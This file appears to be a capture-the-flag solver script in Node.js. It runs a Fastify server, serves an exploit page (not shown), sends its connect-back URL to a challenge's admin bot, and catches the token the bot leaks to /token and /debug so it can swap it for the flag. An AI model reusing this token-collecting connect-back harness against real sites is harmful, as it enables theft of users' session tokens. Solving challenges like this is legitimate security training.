import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs/promises";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const report = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  const html = await fs.readFile("index.html");
  reply.type("text/html; charset=utf-8").send(html);
});

app.post("/debug", (req, reply) => {
  console.log("[DEBUG] " + req.body);
  return "";
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  const flag = await verify(token);
  console.log({ token, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await report(CONNECTBACK_URL);

  await sleep(5 * 1000);
  assert.fail("Failed");
});
